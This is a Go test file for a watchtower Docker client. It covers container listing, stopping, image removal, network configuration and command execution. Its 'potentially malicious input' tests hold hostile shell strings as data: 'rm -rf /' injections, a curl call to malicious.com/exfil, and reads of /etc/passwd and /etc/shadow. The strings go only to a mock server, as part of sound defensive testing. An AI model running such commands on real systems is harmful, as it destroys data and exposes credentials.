package container

import (
	"time"

	"github.com/docker/docker/api/types/container"
	"github.com/docker/docker/api/types/network"

	"github.com/todd2982/watchtower/internal/util"
	"github.com/todd2982/watchtower/pkg/container/mocks"
	"github.com/todd2982/watchtower/pkg/filters"
	t "github.com/todd2982/watchtower/pkg/types"

	"github.com/docker/docker/api/types"
	"github.com/docker/docker/api/types/backend"
	cli "github.com/docker/docker/client"
	"github.com/docker/docker/errdefs"
	"github.com/onsi/gomega/gbytes"
	"github.com/onsi/gomega/ghttp"
	"github.com/sirupsen/logrus"

	. "github.com/onsi/ginkgo"
	. "github.com/onsi/gomega"
	gt "github.com/onsi/gomega/types"

	"context"
	"net/http"
	"strings"
)

var _ = Describe("the client", func() {
	var docker *cli.Client
	var mockServer *ghttp.Server
	BeforeEach(func() {
		mockServer = ghttp.NewServer()
		docker, _ = cli.NewClientWithOpts(
			cli.WithHost(mockServer.URL()),
			cli.WithHTTPClient(mockServer.HTTPTestServer.Client()))
	})
	AfterEach(func() {
		mockServer.Close()
	})
	Describe("WarnOnHeadPullFailed", func() {
		containerUnknown := MockContainer(WithImageName("unknown.repo/prefix/imagename:latest"))
		containerKnown := MockContainer(WithImageName("docker.io/prefix/imagename:latest"))

		When(`warn on head failure is set to "always"`, func() {
			c := dockerClient{ClientOptions: ClientOptions{WarnOnHeadFailed: WarnAlways}}
			It("should always return true", func() {
				Expect(c.WarnOnHeadPullFailed(containerUnknown)).To(BeTrue())
				Expect(c.WarnOnHeadPullFailed(containerKnown)).To(BeTrue())
			})
		})
		When(`warn on head failure is set to "auto"`, func() {
			c := dockerClient{ClientOptions: ClientOptions{WarnOnHeadFailed: WarnAuto}}
			It("should return false for unknown repos", func() {
				Expect(c.WarnOnHeadPullFailed(containerUnknown)).To(BeFalse())
			})
			It("should return true for known repos", func() {
				Expect(c.WarnOnHeadPullFailed(containerKnown)).To(BeTrue())
			})
		})
		When(`warn on head failure is set to "never"`, func() {
			c := dockerClient{ClientOptions: ClientOptions{WarnOnHeadFailed: WarnNever}}
			It("should never return true", func() {
				Expect(c.WarnOnHeadPullFailed(containerUnknown)).To(BeFalse())
				Expect(c.WarnOnHeadPullFailed(containerKnown)).To(BeFalse())
			})
		})
	})
	When("pulling the latest image", func() {
		When("the image consist of a pinned hash", func() {
			It("should gracefully fail with a useful message", func() {
				c := dockerClient{}
				pinnedContainer := MockContainer(WithImageName("sha256:fa5269854a5e615e51a72b17ad3fd1e01268f278a6684c8ed3c5f0cdce3f230b"))
				err := c.PullImage(context.Background(), pinnedContainer)
				Expect(err).To(MatchError(`container uses a pinned image, and cannot be updated by watchtower`))
			})
		})
	})
	When("removing a running container", func() {
		When("the container still exist after stopping", func() {
			It("should attempt to remove the container", func() {
				container := MockContainer(WithContainerState(types.ContainerState{Running: true}))
				containerStopped := MockContainer(WithContainerState(types.ContainerState{Running: false}))

				cid := container.ContainerInfo().ID
				mockServer.AppendHandlers(
					mocks.KillContainerHandler(cid, mocks.Found),
					mocks.GetContainerHandler(cid, containerStopped.ContainerInfo()),
					mocks.RemoveContainerHandler(cid, mocks.Found),
					mocks.GetContainerHandler(cid, nil),
				)

				Expect(dockerClient{api: docker}.StopContainer(container, time.Minute)).To(Succeed())
			})
		})
		When("the container does not exist after stopping", func() {
			It("should not cause an error", func() {
				container := MockContainer(WithContainerState(types.ContainerState{Running: true}))

				cid := container.ContainerInfo().ID
				mockServer.AppendHandlers(
					mocks.KillContainerHandler(cid, mocks.Found),
					mocks.GetContainerHandler(cid, nil),
					mocks.RemoveContainerHandler(cid, mocks.Missing),
				)

				Expect(dockerClient{api: docker}.StopContainer(container, time.Minute)).To(Succeed())
			})
		})
	})
	When("removing a image", func() {
		When("debug logging is enabled", func() {
			It("should log removed and untagged images", func() {
				imageA := util.GenerateRandomSHA256()
				imageAParent := util.GenerateRandomSHA256()
				images := map[string][]string{imageA: {imageAParent}}
				mockServer.AppendHandlers(mocks.RemoveImageHandler(images))
				c := dockerClient{api: docker}

				resetLogrus, logbuf := captureLogrus(logrus.DebugLevel)
				defer resetLogrus()

				Expect(c.RemoveImageByID(t.ImageID(imageA))).To(Succeed())

				shortA := t.ImageID(imageA).ShortID()
				shortAParent := t.ImageID(imageAParent).ShortID()

				Eventually(logbuf).Should(gbytes.Say(`deleted="%v, %v" untagged="?%v"?`, shortA, shortAParent, shortA))
			})
		})
		When("image is not found", func() {
			It("should return an error", func() {
				image := util.GenerateRandomSHA256()
				mockServer.AppendHandlers(mocks.RemoveImageHandler(nil))
				c := dockerClient{api: docker}

				err := c.RemoveImageByID(t.ImageID(image))
				Expect(errdefs.IsNotFound(err)).To(BeTrue())
			})
		})
	})
	When("listing containers", func() {
		When("no filter is provided", func() {
			It("should return all available containers", func() {
				mockServer.AppendHandlers(mocks.ListContainersHandler("running"))
				mockServer.AppendHandlers(mocks.GetContainerHandlers(&mocks.Watchtower, &mocks.Running)...)
				client := dockerClient{
					api:           docker,
					ClientOptions: ClientOptions{},
				}
				containers, err := client.ListContainers(filters.NoFilter)
				Expect(err).NotTo(HaveOccurred())
				Expect(containers).To(HaveLen(2))
			})
		})
		When("a filter matching nothing", func() {
			It("should return an empty array", func() {
				mockServer.AppendHandlers(mocks.ListContainersHandler("running"))
				mockServer.AppendHandlers(mocks.GetContainerHandlers(&mocks.Watchtower, &mocks.Running)...)
				filter := filters.FilterByNames([]string{"lollercoaster"}, filters.NoFilter)
				client := dockerClient{
					api:           docker,
					ClientOptions: ClientOptions{},
				}
				containers, err := client.ListContainers(filter)
				Expect(err).NotTo(HaveOccurred())
				Expect(containers).To(BeEmpty())
			})
		})
		When("a watchtower filter is provided", func() {
			It("should return only the watchtower container", func() {
				mockServer.AppendHandlers(mocks.ListContainersHandler("running"))
				mockServer.AppendHandlers(mocks.GetContainerHandlers(&mocks.Watchtower, &mocks.Running)...)
				client := dockerClient{
					api:           docker,
					ClientOptions: ClientOptions{},
				}
				containers, err := client.ListContainers(filters.WatchtowerContainersFilter)
				Expect(err).NotTo(HaveOccurred())
				Expect(containers).To(ConsistOf(withContainerImageName(Equal("todd2982/watchtower:latest"))))
			})
		})
		When(`include stopped is enabled`, func() {
			It("should return both stopped and running containers", func() {
				mockServer.AppendHandlers(mocks.ListContainersHandler("running", "exited", "created"))
				mockServer.AppendHandlers(mocks.GetContainerHandlers(&mocks.Stopped, &mocks.Watchtower, &mocks.Running)...)
				client := dockerClient{
					api:           docker,
					ClientOptions: ClientOptions{IncludeStopped: true},
				}
				containers, err := client.ListContainers(filters.NoFilter)
				Expect(err).NotTo(HaveOccurred())
				Expect(containers).To(ContainElement(havingRunningState(false)))
			})
		})
		When(`include restarting is enabled`, func() {
			It("should return both restarting and running containers", func() {
				mockServer.AppendHandlers(mocks.ListContainersHandler("running", "restarting"))
				mockServer.AppendHandlers(mocks.GetContainerHandlers(&mocks.Watchtower, &mocks.Running, &mocks.Restarting)...)
				client := dockerClient{
					api:           docker,
					ClientOptions: ClientOptions{IncludeRestarting: true},
				}
				containers, err := client.ListContainers(filters.NoFilter)
				Expect(err).NotTo(HaveOccurred())
				Expect(containers).To(ContainElement(havingRestartingState(true)))
			})
		})
		When(`include restarting is disabled`, func() {
			It("should not return restarting containers", func() {
				mockServer.AppendHandlers(mocks.ListContainersHandler("running"))
				mockServer.AppendHandlers(mocks.GetContainerHandlers(&mocks.Watchtower, &mocks.Running)...)
				client := dockerClient{
					api:           docker,
					ClientOptions: ClientOptions{IncludeRestarting: false},
				}
				containers, err := client.ListContainers(filters.NoFilter)
				Expect(err).NotTo(HaveOccurred())
				Expect(containers).NotTo(ContainElement(havingRestartingState(true)))
			})
		})
		When(`a container uses container network mode`, func() {
			When(`the network container can be resolved`, func() {
				It("should return the container name instead of the ID", func() {
					consumerContainerRef := mocks.NetConsumerOK
					mockServer.AppendHandlers(mocks.GetContainerHandlers(&consumerContainerRef)...)
					client := dockerClient{
						api:           docker,
						ClientOptions: ClientOptions{},
					}
					container, err := client.GetContainer(consumerContainerRef.ContainerID())
					Expect(err).NotTo(HaveOccurred())
					networkMode := container.ContainerInfo().HostConfig.NetworkMode
					Expect(networkMode.ConnectedContainer()).To(Equal(mocks.NetSupplierContainerName))
				})
			})
			When(`the network container cannot be resolved`, func() {
				It("should still return the container ID", func() {
					consumerContainerRef := mocks.NetConsumerInvalidSupplier
					mockServer.AppendHandlers(mocks.GetContainerHandlers(&consumerContainerRef)...)
					client := dockerClient{
						api:           docker,
						ClientOptions: ClientOptions{},
					}
					container, err := client.GetContainer(consumerContainerRef.ContainerID())
					Expect(err).NotTo(HaveOccurred())
					networkMode := container.ContainerInfo().HostConfig.NetworkMode
					Expect(networkMode.ConnectedContainer()).To(Equal(mocks.NetSupplierNotFoundID))
				})
			})
		})
	})
	Describe(`ExecuteCommand`, func() {
		When(`logging`, func() {
			It("should include container id field", func() {
				client := dockerClient{
					api:           docker,
					ClientOptions: ClientOptions{},
				}

				// Capture logrus output in buffer
				resetLogrus, logbuf := captureLogrus(logrus.DebugLevel)
				defer resetLogrus()

				user := ""
				containerID := t.ContainerID("ex-cont-id")
				execID := "ex-exec-id"
				cmd := "exec-cmd"

				mockServer.AppendHandlers(
					// API.ContainerExecCreate
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
						ghttp.VerifyJSONRepresenting(container.ExecOptions{
							User:   user,
							Detach: false,
							Tty:    true,
							Cmd: []string{
								"sh",
								"-c",
								cmd,
							},
						}),
						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
					),
					// API.ContainerExecStart
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
						ghttp.VerifyJSONRepresenting(container.ExecStartOptions{
							Detach: false,
							Tty:    true,
						}),
						ghttp.RespondWith(http.StatusOK, nil),
					),
					// API.ContainerExecInspect
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("GET", HaveSuffix("exec/ex-exec-id/json")),
						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
							ID:       execID,
							Running:  false,
							ExitCode: nil,
							ProcessConfig: &backend.ExecProcessConfig{
								Entrypoint: "sh",
								Arguments:  []string{"-c", cmd},
								User:       user,
							},
							ContainerID: string(containerID),
						}),
					),
				)

				_, err := client.ExecuteCommand(containerID, cmd, 1)
				Expect(err).NotTo(HaveOccurred())
				// Note: Since Execute requires opening up a raw TCP stream to the daemon for the output, this will fail
				// when using the mock API server. Regardless of the outcome, the log should include the container ID
				Eventually(logbuf).Should(gbytes.Say(`containerID="?ex-cont-id"?`))
			})
		})
		When(`executing commands with potentially malicious input`, func() {
			It("should handle commands with shell metacharacters (semicolon)", func() {
				client := dockerClient{
					api:           docker,
					ClientOptions: ClientOptions{},
				}

				containerID := t.ContainerID("test-container")
				execID := "exec-id-semicolon"
				// Command with semicolon that could chain commands
				cmd := "echo hello; rm -rf /"

				mockServer.AppendHandlers(
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
						ghttp.VerifyJSONRepresenting(container.ExecOptions{
							Detach: false,
							Tty:    true,
							Cmd:    []string{"sh", "-c", cmd},
						}),
						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
						ghttp.RespondWith(http.StatusOK, nil),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
							ID:       execID,
							Running:  false,
							ExitCode: nil,
						}),
					),
				)

				_, err := client.ExecuteCommand(containerID, cmd, 1)
				// Test documents current behavior - command is passed through as-is
				Expect(err).NotTo(HaveOccurred())
			})

			It("should handle commands with pipe operators", func() {
				client := dockerClient{
					api:           docker,
					ClientOptions: ClientOptions{},
				}

				containerID := t.ContainerID("test-container")
				execID := "exec-id-pipe"
				// Command with pipe that could redirect output
				cmd := "cat /etc/passwd | grep root"

				mockServer.AppendHandlers(
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
						ghttp.VerifyJSONRepresenting(container.ExecOptions{
							Detach: false,
							Tty:    true,
							Cmd:    []string{"sh", "-c", cmd},
						}),
						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
						ghttp.RespondWith(http.StatusOK, nil),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
							ID:       execID,
							Running:  false,
							ExitCode: nil,
						}),
					),
				)

				_, err := client.ExecuteCommand(containerID, cmd, 1)
				Expect(err).NotTo(HaveOccurred())
			})

			It("should handle commands with logical AND operators", func() {
				client := dockerClient{
					api:           docker,
					ClientOptions: ClientOptions{},
				}

				containerID := t.ContainerID("test-container")
				execID := "exec-id-and"
				// Command with && that chains on success
				cmd := "true && curl http://malicious.com/exfil"

				mockServer.AppendHandlers(
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
						ghttp.VerifyJSONRepresenting(container.ExecOptions{
							Detach: false,
							Tty:    true,
							Cmd:    []string{"sh", "-c", cmd},
						}),
						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
						ghttp.RespondWith(http.StatusOK, nil),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
							ID:       execID,
							Running:  false,
							ExitCode: nil,
						}),
					),
				)

				_, err := client.ExecuteCommand(containerID, cmd, 1)
				Expect(err).NotTo(HaveOccurred())
			})

			It("should handle commands with logical OR operators", func() {
				client := dockerClient{
					api:           docker,
					ClientOptions: ClientOptions{},
				}

				containerID := t.ContainerID("test-container")
				execID := "exec-id-or"
				// Command with || that chains on failure
				cmd := "false || echo fallback"

				mockServer.AppendHandlers(
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
						ghttp.VerifyJSONRepresenting(container.ExecOptions{
							Detach: false,
							Tty:    true,
							Cmd:    []string{"sh", "-c", cmd},
						}),
						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
						ghttp.RespondWith(http.StatusOK, nil),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
							ID:       execID,
							Running:  false,
							ExitCode: nil,
						}),
					),
				)

				_, err := client.ExecuteCommand(containerID, cmd, 1)
				Expect(err).NotTo(HaveOccurred())
			})

			It("should handle commands with backticks for command substitution", func() {
				client := dockerClient{
					api:           docker,
					ClientOptions: ClientOptions{},
				}

				containerID := t.ContainerID("test-container")
				execID := "exec-id-backtick"
				// Command with backticks for command substitution
				cmd := "echo `whoami`"

				mockServer.AppendHandlers(
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
						ghttp.VerifyJSONRepresenting(container.ExecOptions{
							Detach: false,
							Tty:    true,
							Cmd:    []string{"sh", "-c", cmd},
						}),
						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
						ghttp.RespondWith(http.StatusOK, nil),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
							ID:       execID,
							Running:  false,
							ExitCode: nil,
						}),
					),
				)

				_, err := client.ExecuteCommand(containerID, cmd, 1)
				Expect(err).NotTo(HaveOccurred())
			})

			It("should handle commands with $() for command substitution", func() {
				client := dockerClient{
					api:           docker,
					ClientOptions: ClientOptions{},
				}

				containerID := t.ContainerID("test-container")
				execID := "exec-id-dollar-paren"
				// Command with $() for command substitution
				cmd := "echo $(cat /etc/passwd)"

				mockServer.AppendHandlers(
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
						ghttp.VerifyJSONRepresenting(container.ExecOptions{
							Detach: false,
							Tty:    true,
							Cmd:    []string{"sh", "-c", cmd},
						}),
						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
						ghttp.RespondWith(http.StatusOK, nil),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
							ID:       execID,
							Running:  false,
							ExitCode: nil,
						}),
					),
				)

				_, err := client.ExecuteCommand(containerID, cmd, 1)
				Expect(err).NotTo(HaveOccurred())
			})

			It("should handle commands with path traversal attempts", func() {
				client := dockerClient{
					api:           docker,
					ClientOptions: ClientOptions{},
				}

				containerID := t.ContainerID("test-container")
				execID := "exec-id-path-traversal"
				// Command with path traversal
				cmd := "cat ../../../../etc/shadow"

				mockServer.AppendHandlers(
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
						ghttp.VerifyJSONRepresenting(container.ExecOptions{
							Detach: false,
							Tty:    true,
							Cmd:    []string{"sh", "-c", cmd},
						}),
						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
						ghttp.RespondWith(http.StatusOK, nil),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
							ID:       execID,
							Running:  false,
							ExitCode: nil,
						}),
					),
				)

				_, err := client.ExecuteCommand(containerID, cmd, 1)
				Expect(err).NotTo(HaveOccurred())
			})

			It("should handle commands with embedded newlines", func() {
				client := dockerClient{
					api:           docker,
					ClientOptions: ClientOptions{},
				}

				containerID := t.ContainerID("test-container")
				execID := "exec-id-newline"
				// Command with newline that could inject additional commands
				cmd := "echo hello\nrm -rf /"

				mockServer.AppendHandlers(
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
						ghttp.VerifyJSONRepresenting(container.ExecOptions{
							Detach: false,
							Tty:    true,
							Cmd:    []string{"sh", "-c", cmd},
						}),
						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
						ghttp.RespondWith(http.StatusOK, nil),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
							ID:       execID,
							Running:  false,
							ExitCode: nil,
						}),
					),
				)

				_, err := client.ExecuteCommand(containerID, cmd, 1)
				Expect(err).NotTo(HaveOccurred())
			})

			It("should handle very long commands", func() {
				client := dockerClient{
					api:           docker,
					ClientOptions: ClientOptions{},
				}

				containerID := t.ContainerID("test-container")
				execID := "exec-id-long"
				// Very long command (10,000 characters)
				cmd := strings.Repeat("echo hello; ", 1000)

				mockServer.AppendHandlers(
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
						ghttp.VerifyJSONRepresenting(container.ExecOptions{
							Detach: false,
							Tty:    true,
							Cmd:    []string{"sh", "-c", cmd},
						}),
						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
						ghttp.RespondWith(http.StatusOK, nil),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
							ID:       execID,
							Running:  false,
							ExitCode: nil,
						}),
					),
				)

				_, err := client.ExecuteCommand(containerID, cmd, 1)
				Expect(err).NotTo(HaveOccurred())
			})

			It("should handle commands with null bytes", func() {
				client := dockerClient{
					api:           docker,
					ClientOptions: ClientOptions{},
				}

				containerID := t.ContainerID("test-container")
				execID := "exec-id-null"
				// Command with null byte that could truncate strings
				cmd := "echo hello\x00rm -rf /"

				mockServer.AppendHandlers(
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
						ghttp.VerifyJSONRepresenting(container.ExecOptions{
							Detach: false,
							Tty:    true,
							Cmd:    []string{"sh", "-c", cmd},
						}),
						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
						ghttp.RespondWith(http.StatusOK, nil),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
							ID:       execID,
							Running:  false,
							ExitCode: nil,
						}),
					),
				)

				_, err := client.ExecuteCommand(containerID, cmd, 1)
				Expect(err).NotTo(HaveOccurred())
			})

			It("should handle commands with output redirection", func() {
				client := dockerClient{
					api:           docker,
					ClientOptions: ClientOptions{},
				}

				containerID := t.ContainerID("test-container")
				execID := "exec-id-redirect"
				// Command with output redirection
				cmd := "echo secret > /tmp/exfiltrate.txt"

				mockServer.AppendHandlers(
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
						ghttp.VerifyJSONRepresenting(container.ExecOptions{
							Detach: false,
							Tty:    true,
							Cmd:    []string{"sh", "-c", cmd},
						}),
						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
						ghttp.RespondWith(http.StatusOK, nil),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
							ID:       execID,
							Running:  false,
							ExitCode: nil,
						}),
					),
				)

				_, err := client.ExecuteCommand(containerID, cmd, 1)
				Expect(err).NotTo(HaveOccurred())
			})

			It("should handle commands with background execution", func() {
				client := dockerClient{
					api:           docker,
					ClientOptions: ClientOptions{},
				}

				containerID := t.ContainerID("test-container")
				execID := "exec-id-background"
				// Command with background execution
				cmd := "sleep 1000 &"

				mockServer.AppendHandlers(
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
						ghttp.VerifyJSONRepresenting(container.ExecOptions{
							Detach: false,
							Tty:    true,
							Cmd:    []string{"sh", "-c", cmd},
						}),
						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
						ghttp.RespondWith(http.StatusOK, nil),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
							ID:       execID,
							Running:  false,
							ExitCode: nil,
						}),
					),
				)

				_, err := client.ExecuteCommand(containerID, cmd, 1)
				Expect(err).NotTo(HaveOccurred())
			})

			It("should handle environment variable expansion attempts", func() {
				client := dockerClient{
					api:           docker,
					ClientOptions: ClientOptions{},
				}

				containerID := t.ContainerID("test-container")
				execID := "exec-id-env"
				// Command with environment variable expansion
				cmd := "echo $PATH; echo $HOME"

				mockServer.AppendHandlers(
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
						ghttp.VerifyJSONRepresenting(container.ExecOptions{
							Detach: false,
							Tty:    true,
							Cmd:    []string{"sh", "-c", cmd},
						}),
						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
						ghttp.RespondWith(http.StatusOK, nil),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
							ID:       execID,
							Running:  false,
							ExitCode: nil,
						}),
					),
				)

				_, err := client.ExecuteCommand(containerID, cmd, 1)
				Expect(err).NotTo(HaveOccurred())
			})

			It("should handle wildcard glob patterns", func() {
				client := dockerClient{
					api:           docker,
					ClientOptions: ClientOptions{},
				}

				containerID := t.ContainerID("test-container")
				execID := "exec-id-glob"
				// Command with glob patterns
				cmd := "rm -rf /tmp/*"

				mockServer.AppendHandlers(
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("containers/%v/exec", containerID)),
						ghttp.VerifyJSONRepresenting(container.ExecOptions{
							Detach: false,
							Tty:    true,
							Cmd:    []string{"sh", "-c", cmd},
						}),
						ghttp.RespondWithJSONEncoded(http.StatusOK, types.IDResponse{ID: execID}),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("POST", HaveSuffix("exec/%v/start", execID)),
						ghttp.RespondWith(http.StatusOK, nil),
					),
					ghttp.CombineHandlers(
						ghttp.VerifyRequest("GET", HaveSuffix("exec/%v/json", execID)),
						ghttp.RespondWithJSONEncoded(http.StatusOK, backend.ExecInspect{
							ID:       execID,
							Running:  false,
							ExitCode: nil,
						}),
					),
				)

				_, err := client.ExecuteCommand(containerID, cmd, 1)
				Expect(err).NotTo(HaveOccurred())
			})
		})
	})
	Describe(`GetNetworkConfig`, func() {
		When(`providing a container with network aliases`, func() {
			It(`should omit the container ID alias`, func() {
				client := dockerClient{
					api:           docker,
					ClientOptions: ClientOptions{IncludeRestarting: false},
				}
				container := MockContainer(WithImageName("docker.io/prefix/imagename:latest"))

				aliases := []string{"One", "Two", container.ID().ShortID(), "Four"}
				endpoints := map[string]*network.EndpointSettings{
					`test`: {Aliases: aliases},
				}
				container.containerInfo.NetworkSettings = &types.NetworkSettings{Networks: endpoints}
				Expect(container.ContainerInfo().NetworkSettings.Networks[`test`].Aliases).To(Equal(aliases))
				Expect(client.GetNetworkConfig(container).EndpointsConfig[`test`].Aliases).To(Equal([]string{"One", "Two", "Four"}))
			})
		})
		When(`providing a container with MAC addresses`, func() {
			It(`should clear MAC addresses for API compatibility`, func() {
				client := dockerClient{
					api:           docker,
					ClientOptions: ClientOptions{IncludeRestarting: false},
				}
				container := MockContainer(WithImageName("docker.io/prefix/imagename:latest"))

				endpoints := map[string]*network.EndpointSettings{
					`test`: {MacAddress: "02:42:ac:11:00:02"},
				}
				container.containerInfo.NetworkSettings = &types.NetworkSettings{Networks: endpoints}
				Expect(container.ContainerInfo().NetworkSettings.Networks[`test`].MacAddress).To(Equal("02:42:ac:11:00:02"))
				Expect(client.GetNetworkConfig(container).EndpointsConfig[`test`].MacAddress).To(Equal(""))
			})
		})
	})
})

// Capture logrus output in buffer
func captureLogrus(level logrus.Level) (func(), *gbytes.Buffer) {

	logbuf := gbytes.NewBuffer()

	origOut := logrus.StandardLogger().Out
	logrus.SetOutput(logbuf)

	origLev := logrus.StandardLogger().Level
	logrus.SetLevel(level)

	return func() {
		logrus.SetOutput(origOut)
		logrus.SetLevel(origLev)
	}, logbuf
}

// Gomega matcher helpers

func withContainerImageName(matcher gt.GomegaMatcher) gt.GomegaMatcher {
	return WithTransform(containerImageName, matcher)
}

func containerImageName(container t.Container) string {
	return container.ImageName()
}

func havingRestartingState(expected bool) gt.GomegaMatcher {
	return WithTransform(func(container t.Container) bool {
		return container.ContainerInfo().State.Restarting
	}, Equal(expected))
}

func havingRunningState(expected bool) gt.GomegaMatcher {
	return WithTransform(func(container t.Container) bool {
		return container.ContainerInfo().State.Running
	}, Equal(expected))
}
